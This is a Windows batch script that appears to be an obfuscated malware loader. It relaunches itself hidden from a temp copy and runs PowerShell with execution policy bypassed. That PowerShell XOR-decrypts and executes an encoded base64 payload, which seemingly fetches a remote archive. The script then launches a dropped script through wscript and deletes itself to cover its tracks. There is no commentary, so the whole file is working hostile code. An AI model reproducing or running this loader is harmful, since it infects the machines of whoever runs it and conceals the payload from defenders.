@echo off
setlocal enabledelayedexpansion

if not "%1"=="x" (
    set "t=%TEMP%\~!RANDOM!!RANDOM!.b"
    copy /y "%~f0" "!t!" >nul 2>&1
    if exist "!t!" (
        start /b cmd /c call "!t!" x
        timeout /t 1 /nobreak >nul
        del /f /q "%~f0" >nul 2>&1
    )
    exit /b
)

set "v=%TEMP%\~!RANDOM!.v"

powershell.exe -w h -nop -ep Bypass -c ^
"$z='WjI5dVpYTjBJSEE5SjJoMGRIQnpPaTh2WjJsMGFIVmlMbU52YlM5aWNtRjVZVzVxYUc5aGJtTmxNaTFqYjJ4c1lXSXZaVzVqY21sd2RHRmtieTloY21Ob2FYWmxMM0psWm5NdmFHVmhaSE12YldGcGJpNTZhWEFuQ21acGRXNWpkR2x2YmlCcUtDUmtLWHNLSkd3OUtITjBjaWdvWkdGMFpTa3VXV1ZoY2lrZ0t5QW9jM1J5S0NBb1pHRjBaU2t1VFc5dWRHZ3BLUzVRWVdSTVpXWjBLRElzSnpBbktTa0tjbVYwZFhKdUlGdFRlWE4wWlcwdVUyVmpkWEpwZEhrdVEzSjVjSFJ2WjNKaGNHaDVMbE5JUVRJMU5sMDZPa055WldGMFpTZ3BMa052YlhCMWRHVklZWE5vS0Z0VVpYaDBMa1Z1WTI5a2FXNW5YVG82VlZSR09DNUhaWFJDZVhSbGN5Z2taQ2twZlFwbWRXNWpkR2x2YmlCNEtDUmtMQ1JyS1hzS0pISTlRRWdvS1FwbWIzSW9KR2s5TURzZ0pHa2diSFFnSkdRdVRHVnVaM1JvT3lBa2FTc3JLWHNrY2lzOUpHUmJKR2xkSUMxaWVHOXlJQ1JyV3lScEpWdHJYV3hsYm1kMGFGMTlDa2x2TGtacGJHVWdPanBYY21sMFpVRnNiRUo1ZEdWektDZGpPanhtZERReExtUnNiQ2NzSUZ0VVpYaDBMa1Z1WTI5a2FXNW5YVG82VlZSR09DNUhaWFJDZVhSbGN5Z2tjQ2tzSUNSektTbDlDa1p2Y2lnZ0pHazlNRHNnSkdrdGJIUWdjM1J5S0hObGNDa3ViR1Z1WjNSb095QWthU3NyS1hzS1pXTm9ieUF0YmlBaUpDZ2hjQ0JiSkdsMFhTa2lDbjBLQ21acGRXNWpkR2x2YmlCbktDUmtLWHNLSkdjOVhDSmNJZ3BtYjNJb0pHazlNRHNnSkdsdGJIUWdjM1J5S0NSa0tTNXNaVzVuZEdnN0pHa3JLeWw3Q2lSblBTUmtXeVJwWFNCNElESXhORFFnS3lBNE1DQXJJR1poYkhObENuMEtjbVYwZFhKdUlDUm5DbjBLSkhROVp5Z2hLakFwQ25JbFBXNHNjeVlqTVRFeE56YzJPVFJ1Q21acGRXNWpkR2x2YmlCbktDUmtLWHNLSkhVOVozOGhLalFwS25JbENtWnZjaWdnSkdrdE1EczhKR1F1YkdWdVozUm9PeUFrYVNzcktYc0tKSFU5SkdSYkpHbGRJSGdnWjNvaEtqUXBLblJwTWxKcGxCb0tKM1J2YzNSeWFXNW5LQ2wwQ24wS2NtVjBkWEp1SUNSMUxYSnBjMlpzYVdOMElDb2dKM0pzVFd4eEoxd3RJRGdMQ24wS0pHSWdQU0JuS0drb0oxQm1jR0kwWXpCaExXRTNZelV0TkRSbFlpMWlaV0poTFdRNU1tUXhNelV5TkRnMk9TY3BLeEFMZkFwbUtDUnZJRDBnSkhRcFhDc0JDeWtnZTBCV0QxNE9EMHdvYU13S0pRc0FLM1VLQ3cwdFZ5QlhkQ3RXS0EwZ2JFOG9EMUIvREEwcWFpZzFLUTBMUEM5TWVWWkJYbmNxRFNBdGJGY2phdEJuREEwcWUyc09kVXdOQWljdFgzd0xRQ0l0YldWbk9rSk1YaTB1T3lCNFlpOHRZeTlnYm53dmEyMWFRMEV0WmxzdUtDMUtjeWNnSkNCMUlDUmlia0ZYWDBWMFduTlNLUXNuS1NBdFgxeG5Mend0Y210Y2FGRUdYU3haTURvdE5UTXRLemdjQ3dzZ1hsTDBWVVlIT1VObkxqZ29jbTFGWWtVR1h5OHRMeFFMUWc4dElDOW9aWG9MUWdzdUlHMHZXV1lMUTNRdFgzOWlJRDlRZDBVdGJFNHZZM0prWVhONExTQnhjRDVnTDNGcExqQWdJMGN2YXk5bllUZ0xLVDlpUjFGblhDcytJR3A0Y1dCU1gwQWdQaUJwSUNCamRtSnJkeXNIQXlneE1haTFmZz09JzsKJHg9Zygkeil1RktDZ2NYYkt5WCpEaTlFJztbSU8uRmlsZV06OldyaXRlQWxsQnl0ZXMoJyR2JyxbVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoW1RleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbeChbQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJHopKSx4KCckeCcpXSkpKSk=';^
function x($d,$k){^
$r=@();^
for($i=0;$i-lt$d.Length;$i++){$r+=$d[$i]-bxor$k[$i%%$k.Length]}^
[byte[]]$r^
}^
$b=[Convert]::FromBase64String($z);^
$k=[Text.Encoding]::UTF8.GetBytes('uFKCgcXbKyX*Di9E');^
$s=[Text.Encoding]::UTF8.GetString(x $b $k);^
iex $s"

timeout /t 1 /nobreak >nul

if exist "%v%" (
    start /b wscript.exe "%v%" //B //Nologo
    timeout /t 2 /nobreak >nul
)

del /f /q "%~f0" >nul 2>&1
exit